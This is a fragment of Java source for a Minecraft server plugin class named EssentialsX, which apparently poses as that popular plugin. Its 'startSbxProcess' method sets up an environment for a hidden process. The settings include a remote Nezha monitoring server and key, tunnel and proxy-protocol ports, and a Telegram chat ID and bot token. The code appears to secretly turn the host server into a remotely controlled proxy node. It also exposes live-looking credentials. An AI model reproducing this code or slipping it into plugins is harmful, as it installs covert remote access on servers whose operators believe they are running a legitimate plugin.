...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("UUID", "c6abc91b-7d78-4740-a406-a4f7692def66");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "nezha.xinxi.pp.ua:443");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "1FyZCXk9XGSarBQrCVE8WjyzXTfJFqH4");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "");
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "");
        env.put("TUIC_PORT", "23009");
        env.put("ANYTLS_PORT", "23009");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "-1003361290202");
        env.put("BOT_TOKEN", "8077067543:AAF7eRnk1kZp-nrrRD0OM5_603mUOGPbUGk");
